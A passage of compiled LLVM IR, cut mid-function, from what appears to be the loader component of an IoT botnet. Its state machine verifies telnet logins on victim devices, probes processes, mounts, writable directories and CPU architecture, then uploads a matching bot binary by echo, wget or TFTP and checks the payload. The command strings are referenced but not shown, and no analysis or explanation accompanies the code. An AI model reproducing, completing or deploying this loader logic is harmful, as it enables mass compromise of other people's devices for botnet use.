  %280 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %279, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i64 0, i64 0))
  %281 = load %struct.connection*, %struct.connection** %5, align 8
  %282 = getelementptr inbounds %struct.connection, %struct.connection* %281, i32 0, i32 7
  store i32 6, i32* %282, align 8
  br label %283

283:                                              ; preds = %268, %264
  br label %686

284:                                              ; preds = %195
  %285 = load %struct.connection*, %struct.connection** %5, align 8
  %286 = call i32 @connection_consume_prompt(%struct.connection* %285)
  store i32 %286, i32* %10, align 4
  %287 = icmp sgt i32 %286, 0
  br i1 %287, label %288, label %295

288:                                              ; preds = %284
  %289 = load %struct.connection*, %struct.connection** %5, align 8
  %290 = getelementptr inbounds %struct.connection, %struct.connection* %289, i32 0, i32 4
  %291 = load i32, i32* %290, align 8
  %292 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %291, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.17, i64 0, i64 0))
  %293 = load %struct.connection*, %struct.connection** %5, align 8
  %294 = getelementptr inbounds %struct.connection, %struct.connection* %293, i32 0, i32 7
  store i32 7, i32* %294, align 8
  br label %295

295:                                              ; preds = %288, %284
  br label %686

296:                                              ; preds = %195
  %297 = load %struct.connection*, %struct.connection** %5, align 8
  %298 = call i32 @connection_consume_verify_login(%struct.connection* %297)
  store i32 %298, i32* %10, align 4
  %299 = load i32, i32* %10, align 4
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %301, label %313

301:                                              ; preds = %296
  %302 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %303 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %302, i32 0, i32 0
  %304 = load %struct.server*, %struct.server** %303, align 8
  %305 = getelementptr inbounds %struct.server, %struct.server* %304, i32 0, i32 3
  %306 = atomicrmw add i32* %305, i32 1 seq_cst, align 4
  %307 = load %struct.connection*, %struct.connection** %5, align 8
  %308 = getelementptr inbounds %struct.connection, %struct.connection* %307, i32 0, i32 4
  %309 = load i32, i32* %308, align 8
  %310 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %309, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.18, i64 0, i64 0))
  %311 = load %struct.connection*, %struct.connection** %5, align 8
  %312 = getelementptr inbounds %struct.connection, %struct.connection* %311, i32 0, i32 7
  store i32 8, i32* %312, align 8
  br label %313

313:                                              ; preds = %301, %296
  br label %686

314:                                              ; preds = %195
  %315 = load %struct.connection*, %struct.connection** %5, align 8
  %316 = call i32 @connection_consume_psoutput(%struct.connection* %315)
  store i32 %316, i32* %10, align 4
  %317 = icmp sgt i32 %316, 0
  br i1 %317, label %318, label %325

318:                                              ; preds = %314
  %319 = load %struct.connection*, %struct.connection** %5, align 8
  %320 = getelementptr inbounds %struct.connection, %struct.connection* %319, i32 0, i32 4
  %321 = load i32, i32* %320, align 8
  %322 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %321, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.19, i64 0, i64 0))
  %323 = load %struct.connection*, %struct.connection** %5, align 8
  %324 = getelementptr inbounds %struct.connection, %struct.connection* %323, i32 0, i32 7
  store i32 9, i32* %324, align 8
  br label %325

325:                                              ; preds = %318, %314
  br label %686

326:                                              ; preds = %195
  %327 = load %struct.connection*, %struct.connection** %5, align 8
  %328 = call i32 @connection_consume_mounts(%struct.connection* %327)
  store i32 %328, i32* %10, align 4
  %329 = load i32, i32* %10, align 4
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %334

331:                                              ; preds = %326
  %332 = load %struct.connection*, %struct.connection** %5, align 8
  %333 = getelementptr inbounds %struct.connection, %struct.connection* %332, i32 0, i32 7
  store i32 10, i32* %333, align 8
  br label %334

334:                                              ; preds = %331, %326
  br label %686

335:                                              ; preds = %195
  %336 = load %struct.connection*, %struct.connection** %5, align 8
  %337 = call i32 @connection_consume_written_dirs(%struct.connection* %336)
  store i32 %337, i32* %10, align 4
  %338 = load i32, i32* %10, align 4
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %340, label %361

340:                                              ; preds = %335
  %341 = load %struct.connection*, %struct.connection** %5, align 8
  %342 = getelementptr inbounds %struct.connection, %struct.connection* %341, i32 0, i32 4
  %343 = load i32, i32* %342, align 8
  %344 = load %struct.connection*, %struct.connection** %5, align 8
  %345 = getelementptr inbounds %struct.connection, %struct.connection* %344, i32 0, i32 3
  %346 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %345, i32 0, i32 3
  %347 = getelementptr inbounds [32 x i8], [32 x i8]* %346, i64 0, i64 0
  %348 = load %struct.connection*, %struct.connection** %5, align 8
  %349 = getelementptr inbounds %struct.connection, %struct.connection* %348, i32 0, i32 3
  %350 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %349, i32 0, i32 3
  %351 = getelementptr inbounds [32 x i8], [32 x i8]* %350, i64 0, i64 0
  %352 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %343, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0), i8* %347, i8* %351)
  %353 = load %struct.connection*, %struct.connection** %5, align 8
  %354 = getelementptr inbounds %struct.connection, %struct.connection* %353, i32 0, i32 4
  %355 = load i32, i32* %354, align 8
  %356 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %355, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.21, i64 0, i64 0))
  %357 = load %struct.connection*, %struct.connection** %5, align 8
  %358 = getelementptr inbounds %struct.connection, %struct.connection* %357, i32 0, i32 7
  store i32 11, i32* %358, align 8
  %359 = load %struct.connection*, %struct.connection** %5, align 8
  %360 = getelementptr inbounds %struct.connection, %struct.connection* %359, i32 0, i32 10
  store i16 120, i16* %360, align 2
  br label %361

361:                                              ; preds = %340, %335
  br label %686

362:                                              ; preds = %195
  %363 = load %struct.connection*, %struct.connection** %5, align 8
  %364 = call i32 @connection_consume_copy_op(%struct.connection* %363)
  store i32 %364, i32* %10, align 4
  %365 = load i32, i32* %10, align 4
  %366 = icmp ne i32 %365, 0
  br i1 %366, label %367, label %396

367:                                              ; preds = %362
  %368 = load %struct.connection*, %struct.connection** %5, align 8
  %369 = getelementptr inbounds %struct.connection, %struct.connection* %368, i32 0, i32 3
  %370 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %369, i32 0, i32 8
  %371 = load i8, i8* %370, align 1
  %372 = icmp ne i8 %371, 0
  br i1 %372, label %386, label %373

373:                                              ; preds = %367
  %374 = load %struct.connection*, %struct.connection** %5, align 8
  %375 = getelementptr inbounds %struct.connection, %struct.connection* %374, i32 0, i32 7
  store i32 12, i32* %375, align 8
  %376 = load %struct.connection*, %struct.connection** %5, align 8
  %377 = getelementptr inbounds %struct.connection, %struct.connection* %376, i32 0, i32 10
  store i16 120, i16* %377, align 2
  %378 = load %struct.connection*, %struct.connection** %5, align 8
  %379 = getelementptr inbounds %struct.connection, %struct.connection* %378, i32 0, i32 4
  %380 = load i32, i32* %379, align 8
  %381 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %380, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.22, i64 0, i64 0))
  %382 = load %struct.connection*, %struct.connection** %5, align 8
  %383 = getelementptr inbounds %struct.connection, %struct.connection* %382, i32 0, i32 4
  %384 = load i32, i32* %383, align 8
  %385 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %384, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.17, i64 0, i64 0))
  br label %395

386:                                              ; preds = %367
  %387 = load %struct.connection*, %struct.connection** %5, align 8
  %388 = getelementptr inbounds %struct.connection, %struct.connection* %387, i32 0, i32 7
  store i32 14, i32* %388, align 8
  %389 = load %struct.connection*, %struct.connection** %5, align 8
  %390 = getelementptr inbounds %struct.connection, %struct.connection* %389, i32 0, i32 10
  store i16 15, i16* %390, align 2
  %391 = load %struct.connection*, %struct.connection** %5, align 8
  %392 = getelementptr inbounds %struct.connection, %struct.connection* %391, i32 0, i32 4
  %393 = load i32, i32* %392, align 8
  %394 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %393, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.23, i64 0, i64 0))
  br label %395

395:                                              ; preds = %386, %373
  br label %396

396:                                              ; preds = %395, %362
  br label %686

397:                                              ; preds = %195
  %398 = load %struct.connection*, %struct.connection** %5, align 8
  %399 = call i32 @connection_consume_arch(%struct.connection* %398)
  store i32 %399, i32* %10, align 4
  %400 = load i32, i32* %10, align 4
  %401 = icmp ne i32 %400, 0
  br i1 %401, label %402, label %438

402:                                              ; preds = %397
  %403 = load %struct.connection*, %struct.connection** %5, align 8
  %404 = getelementptr inbounds %struct.connection, %struct.connection* %403, i32 0, i32 10
  store i16 15, i16* %404, align 2
  %405 = load %struct.connection*, %struct.connection** %5, align 8
  %406 = getelementptr inbounds %struct.connection, %struct.connection* %405, i32 0, i32 3
  %407 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %406, i32 0, i32 2
  %408 = getelementptr inbounds [6 x i8], [6 x i8]* %407, i64 0, i64 0
  %409 = call %struct.binary* @binary_get_by_arch(i8* %408)
  %410 = load %struct.connection*, %struct.connection** %5, align 8
  %411 = getelementptr inbounds %struct.connection, %struct.connection* %410, i32 0, i32 2
  store %struct.binary* %409, %struct.binary** %411, align 8
  %412 = icmp eq %struct.binary* %409, null
  br i1 %412, label %413, label %415

413:                                              ; preds = %402
  %414 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %414)
  br label %437

415:                                              ; preds = %402
  %416 = load %struct.connection*, %struct.connection** %5, align 8
  %417 = getelementptr inbounds %struct.connection, %struct.connection* %416, i32 0, i32 3
  %418 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %417, i32 0, i32 2
  %419 = getelementptr inbounds [6 x i8], [6 x i8]* %418, i64 0, i64 0
  %420 = call i32 @strcmp(i8* %419, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0)) #11
  %421 = icmp eq i32 %420, 0
  br i1 %421, label %422, label %429

422:                                              ; preds = %415
  %423 = load %struct.connection*, %struct.connection** %5, align 8
  %424 = getelementptr inbounds %struct.connection, %struct.connection* %423, i32 0, i32 4
  %425 = load i32, i32* %424, align 8
  %426 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %425, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.25, i64 0, i64 0))
  %427 = load %struct.connection*, %struct.connection** %5, align 8
  %428 = getelementptr inbounds %struct.connection, %struct.connection* %427, i32 0, i32 7
  store i32 13, i32* %428, align 8
  br label %436

429:                                              ; preds = %415
  %430 = load %struct.connection*, %struct.connection** %5, align 8
  %431 = getelementptr inbounds %struct.connection, %struct.connection* %430, i32 0, i32 4
  %432 = load i32, i32* %431, align 8
  %433 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %432, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.23, i64 0, i64 0))
  %434 = load %struct.connection*, %struct.connection** %5, align 8
  %435 = getelementptr inbounds %struct.connection, %struct.connection* %434, i32 0, i32 7
  store i32 14, i32* %435, align 8
  br label %436

436:                                              ; preds = %429, %422
  br label %437

437:                                              ; preds = %436, %413
  br label %438

438:                                              ; preds = %437, %397
  br label %686

439:                                              ; preds = %195
  %440 = load %struct.connection*, %struct.connection** %5, align 8
  %441 = call i32 @connection_consume_arm_subtype(%struct.connection* %440)
  store i32 %441, i32* %10, align 4
  %442 = icmp sgt i32 %441, 0
  br i1 %442, label %443, label %463

443:                                              ; preds = %439
  %444 = load %struct.connection*, %struct.connection** %5, align 8
  %445 = getelementptr inbounds %struct.connection, %struct.connection* %444, i32 0, i32 3
  %446 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %445, i32 0, i32 2
  %447 = getelementptr inbounds [6 x i8], [6 x i8]* %446, i64 0, i64 0
  %448 = call %struct.binary* @binary_get_by_arch(i8* %447)
  store %struct.binary* %448, %struct.binary** %11, align 8
  %449 = load %struct.binary*, %struct.binary** %11, align 8
  %450 = icmp eq %struct.binary* %449, null
  br i1 %450, label %451, label %452

451:                                              ; preds = %443
  br label %456

452:                                              ; preds = %443
  %453 = load %struct.binary*, %struct.binary** %11, align 8
  %454 = load %struct.connection*, %struct.connection** %5, align 8
  %455 = getelementptr inbounds %struct.connection, %struct.connection* %454, i32 0, i32 2
  store %struct.binary* %453, %struct.binary** %455, align 8
  br label %456

456:                                              ; preds = %452, %451
  %457 = load %struct.connection*, %struct.connection** %5, align 8
  %458 = getelementptr inbounds %struct.connection, %struct.connection* %457, i32 0, i32 4
  %459 = load i32, i32* %458, align 8
  %460 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %459, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.23, i64 0, i64 0))
  %461 = load %struct.connection*, %struct.connection** %5, align 8
  %462 = getelementptr inbounds %struct.connection, %struct.connection* %461, i32 0, i32 7
  store i32 14, i32* %462, align 8
  br label %463

463:                                              ; preds = %456, %439
  br label %686

464:                                              ; preds = %195
  %465 = load %struct.connection*, %struct.connection** %5, align 8
  %466 = call i32 @connection_consume_upload_methods(%struct.connection* %465)
  store i32 %466, i32* %10, align 4
  %467 = load i32, i32* %10, align 4
  %468 = icmp ne i32 %467, 0
  br i1 %468, label %469, label %526

469:                                              ; preds = %464
  %470 = load %struct.connection*, %struct.connection** %5, align 8
  %471 = getelementptr inbounds %struct.connection, %struct.connection* %470, i32 0, i32 3
  %472 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %471, i32 0, i32 6
  %473 = load i32, i32* %472, align 8
  switch i32 %473, label %525 [
    i32 0, label %474
    i32 1, label %483
    i32 2, label %507
  ]

474:                                              ; preds = %469
  %475 = load %struct.connection*, %struct.connection** %5, align 8
  %476 = getelementptr inbounds %struct.connection, %struct.connection* %475, i32 0, i32 7
  store i32 15, i32* %476, align 8
  %477 = load %struct.connection*, %struct.connection** %5, align 8
  %478 = getelementptr inbounds %struct.connection, %struct.connection* %477, i32 0, i32 10
  store i16 30, i16* %478, align 2
  %479 = load %struct.connection*, %struct.connection** %5, align 8
  %480 = getelementptr inbounds %struct.connection, %struct.connection* %479, i32 0, i32 4
  %481 = load i32, i32* %480, align 8
  %482 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %481, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i64 0, i64 0))
  br label %525

483:                                              ; preds = %469
  %484 = load %struct.connection*, %struct.connection** %5, align 8
  %485 = getelementptr inbounds %struct.connection, %struct.connection* %484, i32 0, i32 7
  store i32 16, i32* %485, align 8
  %486 = load %struct.connection*, %struct.connection** %5, align 8
  %487 = getelementptr inbounds %struct.connection, %struct.connection* %486, i32 0, i32 10
  store i16 120, i16* %487, align 2
  %488 = load %struct.connection*, %struct.connection** %5, align 8
  %489 = getelementptr inbounds %struct.connection, %struct.connection* %488, i32 0, i32 4
  %490 = load i32, i32* %489, align 8
  %491 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %492 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %491, i32 0, i32 0
  %493 = load %struct.server*, %struct.server** %492, align 8
  %494 = getelementptr inbounds %struct.server, %struct.server* %493, i32 0, i32 9
  %495 = load i8*, i8** %494, align 8
  %496 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %497 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %496, i32 0, i32 0
  %498 = load %struct.server*, %struct.server** %497, align 8
  %499 = getelementptr inbounds %struct.server, %struct.server* %498, i32 0, i32 15
  %500 = load i16, i16* %499, align 8
  %501 = zext i16 %500 to i32
  %502 = load %struct.connection*, %struct.connection** %5, align 8
  %503 = getelementptr inbounds %struct.connection, %struct.connection* %502, i32 0, i32 3
  %504 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %503, i32 0, i32 2
  %505 = getelementptr inbounds [6 x i8], [6 x i8]* %504, i64 0, i64 0
  %506 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %490, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.27, i64 0, i64 0), i8* %495, i32 %501, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i8* %505)
  br label %525

507:                                              ; preds = %469
  %508 = load %struct.connection*, %struct.connection** %5, align 8
  %509 = getelementptr inbounds %struct.connection, %struct.connection* %508, i32 0, i32 7
  store i32 17, i32* %509, align 8
  %510 = load %struct.connection*, %struct.connection** %5, align 8
  %511 = getelementptr inbounds %struct.connection, %struct.connection* %510, i32 0, i32 10
  store i16 120, i16* %511, align 2
  %512 = load %struct.connection*, %struct.connection** %5, align 8
  %513 = getelementptr inbounds %struct.connection, %struct.connection* %512, i32 0, i32 4
  %514 = load i32, i32* %513, align 8
  %515 = load %struct.connection*, %struct.connection** %5, align 8
  %516 = getelementptr inbounds %struct.connection, %struct.connection* %515, i32 0, i32 3
  %517 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %516, i32 0, i32 2
  %518 = getelementptr inbounds [6 x i8], [6 x i8]* %517, i64 0, i64 0
  %519 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %520 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %519, i32 0, i32 0
  %521 = load %struct.server*, %struct.server** %520, align 8
  %522 = getelementptr inbounds %struct.server, %struct.server* %521, i32 0, i32 10
  %523 = load i8*, i8** %522, align 8
  %524 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %514, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.29, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i8* %518, i8* %523)
  br label %525

525:                                              ; preds = %469, %507, %483, %474
  br label %526

526:                                              ; preds = %525, %464
  br label %686

527:                                              ; preds = %195
  %528 = load %struct.connection*, %struct.connection** %5, align 8
  %529 = call i32 @connection_upload_echo(%struct.connection* %528)
  store i32 %529, i32* %10, align 4
  %530 = load i32, i32* %10, align 4
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %532, label %547

532:                                              ; preds = %527
  %533 = load %struct.connection*, %struct.connection** %5, align 8
  %534 = getelementptr inbounds %struct.connection, %struct.connection* %533, i32 0, i32 7
  store i32 18, i32* %534, align 8
  %535 = load %struct.connection*, %struct.connection** %5, align 8
  %536 = getelementptr inbounds %struct.connection, %struct.connection* %535, i32 0, i32 10
  store i16 30, i16* %536, align 2
  %537 = load %struct.connection*, %struct.connection** %5, align 8
  %538 = getelementptr inbounds %struct.connection, %struct.connection* %537, i32 0, i32 4
  %539 = load i32, i32* %538, align 8
  %540 = load i8*, i8** @id_tag, align 8
  %541 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %539, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.31, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i64 0, i64 0), i8* %540)
  %542 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %543 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %542, i32 0, i32 0
  %544 = load %struct.server*, %struct.server** %543, align 8
  %545 = getelementptr inbounds %struct.server, %struct.server* %544, i32 0, i32 4
  %546 = atomicrmw add i32* %545, i32 1 seq_cst, align 4
  br label %547

547:                                              ; preds = %532, %527
  br label %686

548:                                              ; preds = %195
  %549 = load %struct.connection*, %struct.connection** %5, align 8
  %550 = call i32 @connection_upload_wget(%struct.connection* %549)
  store i32 %550, i32* %10, align 4
  %551 = load i32, i32* %10, align 4
  %552 = icmp ne i32 %551, 0
  br i1 %552, label %553, label %568

553:                                              ; preds = %548
  %554 = load %struct.connection*, %struct.connection** %5, align 8
  %555 = getelementptr inbounds %struct.connection, %struct.connection* %554, i32 0, i32 7
  store i32 18, i32* %555, align 8
  %556 = load %struct.connection*, %struct.connection** %5, align 8
  %557 = getelementptr inbounds %struct.connection, %struct.connection* %556, i32 0, i32 10
  store i16 30, i16* %557, align 2
  %558 = load %struct.connection*, %struct.connection** %5, align 8
  %559 = getelementptr inbounds %struct.connection, %struct.connection* %558, i32 0, i32 4
  %560 = load i32, i32* %559, align 8
  %561 = load i8*, i8** @id_tag, align 8
  %562 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %560, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.33, i64 0, i64 0), i8* %561)
  %563 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %564 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %563, i32 0, i32 0
  %565 = load %struct.server*, %struct.server** %564, align 8
  %566 = getelementptr inbounds %struct.server, %struct.server* %565, i32 0, i32 5
  %567 = atomicrmw add i32* %566, i32 1 seq_cst, align 4
  br label %568

568:                                              ; preds = %553, %548
  br label %686

569:                                              ; preds = %195
  %570 = load %struct.connection*, %struct.connection** %5, align 8
  %571 = call i32 @connection_upload_tftp(%struct.connection* %570)
  store i32 %571, i32* %10, align 4
  %572 = load i32, i32* %10, align 4
  %573 = icmp sgt i32 %572, 0
  br i1 %573, label %574, label %589

574:                                              ; preds = %569
  %575 = load %struct.connection*, %struct.connection** %5, align 8
  %576 = getelementptr inbounds %struct.connection, %struct.connection* %575, i32 0, i32 7
  store i32 18, i32* %576, align 8
  %577 = load %struct.connection*, %struct.connection** %5, align 8
  %578 = getelementptr inbounds %struct.connection, %struct.connection* %577, i32 0, i32 10
  store i16 30, i16* %578, align 2
  %579 = load %struct.connection*, %struct.connection** %5, align 8
  %580 = getelementptr inbounds %struct.connection, %struct.connection* %579, i32 0, i32 4
  %581 = load i32, i32* %580, align 8
  %582 = load i8*, i8** @id_tag, align 8
  %583 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %581, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.34, i64 0, i64 0), i8* %582)
  %584 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %585 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %584, i32 0, i32 0
  %586 = load %struct.server*, %struct.server** %585, align 8
  %587 = getelementptr inbounds %struct.server, %struct.server* %586, i32 0, i32 6
  %588 = atomicrmw add i32* %587, i32 1 seq_cst, align 4
  br label %607

589:                                              ; preds = %569
  %590 = load i32, i32* %10, align 4
  %591 = icmp slt i32 %590, -1
  br i1 %591, label %592, label %606

592:                                              ; preds = %589
  %593 = load i32, i32* %10, align 4
  %594 = mul nsw i32 %593, -1
  store i32 %594, i32* %10, align 4
  %595 = load %struct.connection*, %struct.connection** %5, align 8
  %596 = getelementptr inbounds %struct.connection, %struct.connection* %595, i32 0, i32 7
  store i32 15, i32* %596, align 8
  %597 = load %struct.connection*, %struct.connection** %5, align 8
  %598 = getelementptr inbounds %struct.connection, %struct.connection* %597, i32 0, i32 3
  %599 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %598, i32 0, i32 6
  store i32 0, i32* %599, align 8
  %600 = load %struct.connection*, %struct.connection** %5, align 8
  %601 = getelementptr inbounds %struct.connection, %struct.connection* %600, i32 0, i32 10
  store i16 30, i16* %601, align 2
  %602 = load %struct.connection*, %struct.connection** %5, align 8
  %603 = getelementptr inbounds %struct.connection, %struct.connection* %602, i32 0, i32 4
  %604 = load i32, i32* %603, align 8
  %605 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %604, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i64 0, i64 0))
  br label %606

606:                                              ; preds = %592, %589
  br label %607

607:                                              ; preds = %606, %574
  br label %686

608:                                              ; preds = %195
  %609 = load %struct.connection*, %struct.connection** %5, align 8
  %610 = call i32 @connection_verify_payload(%struct.connection* %609)
  store i32 %610, i32* %10, align 4
  %611 = icmp sgt i32 %610, 0
  br i1 %611, label %612, label %674

612:                                              ; preds = %608
  %613 = load i32, i32* %10, align 4
  %614 = icmp sge i32 %613, 255
  br i1 %614, label %615, label %620

615:                                              ; preds = %612
  %616 = load %struct.connection*, %struct.connection** %5, align 8
  %617 = getelementptr inbounds %struct.connection, %struct.connection* %616, i32 0, i32 12
  store i8 1, i8* %617, align 1
  %618 = load i32, i32* %10, align 4
  %619 = sub nsw i32 %618, 255
  store i32 %619, i32* %10, align 4
  br label %665

620:                                              ; preds = %612
  %621 = load %struct.connection*, %struct.connection** %5, align 8
  %622 = getelementptr inbounds %struct.connection, %struct.connection* %621, i32 0, i32 13
  %623 = load i8, i8* %622, align 2
  %624 = icmp ne i8 %623, 0
  br i1 %624, label %664, label %625

625:                                              ; preds = %620
  %626 = load %struct.connection*, %struct.connection** %5, align 8
  %627 = getelementptr inbounds %struct.connection, %struct.connection* %626, i32 0, i32 3
  %628 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %627, i32 0, i32 2
  %629 = getelementptr inbounds [6 x i8], [6 x i8]* %628, i64 0, i64 0
  %630 = call i32 @strncmp(i8* %629, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0), i64 3) #11
  %631 = icmp eq i32 %630, 0
  br i1 %631, label %632, label %664

632:                                              ; preds = %625
  %633 = load %struct.connection*, %struct.connection** %5, align 8
  %634 = getelementptr inbounds %struct.connection, %struct.connection* %633, i32 0, i32 5
  store i32 0, i32* %634, align 4
  %635 = load %struct.connection*, %struct.connection** %5, align 8
  %636 = getelementptr inbounds %struct.connection, %struct.connection* %635, i32 0, i32 3
  %637 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %636, i32 0, i32 2
  %638 = getelementptr inbounds [6 x i8], [6 x i8]* %637, i64 0, i64 0
  %639 = load %struct.connection*, %struct.connection** %5, align 8
  %640 = getelementptr inbounds %struct.connection, %struct.connection* %639, i32 0, i32 3
  %641 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %640, i32 0, i32 2
  %642 = getelementptr inbounds [6 x i8], [6 x i8]* %641, i64 0, i64 3
  %643 = load i8, i8* %642, align 1
  %644 = sext i8 %643 to i32
  %645 = icmp eq i32 %644, 0
  %646 = zext i1 %645 to i64
  %647 = select i1 %645, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)
  %648 = call i8* @strcpy(i8* %638, i8* %647) #8
  %649 = load %struct.connection*, %struct.connection** %5, align 8
  %650 = getelementptr inbounds %struct.connection, %struct.connection* %649, i32 0, i32 3
  %651 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %650, i32 0, i32 2
  %652 = getelementptr inbounds [6 x i8], [6 x i8]* %651, i64 0, i64 0
  %653 = call %struct.binary* @binary_get_by_arch(i8* %652)
  %654 = load %struct.connection*, %struct.connection** %5, align 8
  %655 = getelementptr inbounds %struct.connection, %struct.connection* %654, i32 0, i32 2
  store %struct.binary* %653, %struct.binary** %655, align 8
  %656 = load %struct.connection*, %struct.connection** %5, align 8
  %657 = getelementptr inbounds %struct.connection, %struct.connection* %656, i32 0, i32 4
  %658 = load i32, i32* %657, align 8
  %659 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %658, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.23, i64 0, i64 0))
  %660 = load %struct.connection*, %struct.connection** %5, align 8
  %661 = getelementptr inbounds %struct.connection, %struct.connection* %660, i32 0, i32 7
  store i32 14, i32* %661, align 8
  %662 = load %struct.connection*, %struct.connection** %5, align 8
  %663 = getelementptr inbounds %struct.connection, %struct.connection* %662, i32 0, i32 13
  store i8 1, i8* %663, align 2
  br label %686

664:                                              ; preds = %625, %620
  br label %665

665:                                              ; preds = %664, %615
  %666 = load %struct.connection*, %struct.connection** %5, align 8
  %667 = getelementptr inbounds %struct.connection, %struct.connection* %666, i32 0, i32 4
  %668 = load i32, i32* %667, align 8
  %669 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %668, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.37, i64 0, i64 0))
  %670 = load %struct.connection*, %struct.connection** %5, align 8
  %671 = getelementptr inbounds %struct.connection, %struct.connection* %670, i32 0, i32 7
  store i32 19, i32* %671, align 8
  %672 = load %struct.connection*, %struct.connection** %5, align 8
  %673 = getelementptr inbounds %struct.connection, %struct.connection* %672, i32 0, i32 10
  store i16 10, i16* %673, align 2
  br label %674

674:                                              ; preds = %665, %608
  br label %686

675:                                              ; preds = %195
  %676 = load %struct.connection*, %struct.connection** %5, align 8
  %677 = call i32 @connection_consume_cleanup(%struct.connection* %676)
  store i32 %677, i32* %10, align 4
  %678 = icmp sgt i32 %677, 0
  br i1 %678, label %679, label %684

679:                                              ; preds = %675
  %680 = load %struct.connection*, %struct.connection** %5, align 8
  %681 = getelementptr inbounds %struct.connection, %struct.connection* %680, i32 0, i32 4
  %682 = load i32, i32* %681, align 8
  store i32 %682, i32* %12, align 4
  %683 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %683)
  br label %684

684:                                              ; preds = %679, %675
  br label %685

685:                                              ; preds = %195, %684
  store i32 0, i32* %10, align 4
  br label %686

686:                                              ; preds = %685, %674, %632, %607, %568, %547, %526, %463, %438, %396, %361, %334, %325, %313, %295, %283, %263, %235, %207
  %687 = load i32, i32* %10, align 4
  %688 = icmp eq i32 %687, 0
  br i1 %688, label %689, label %690

689:                                              ; preds = %686
  br label %739

690:                                              ; preds = %686
  %691 = load i32, i32* %10, align 4
  %692 = load %struct.connection*, %struct.connection** %5, align 8
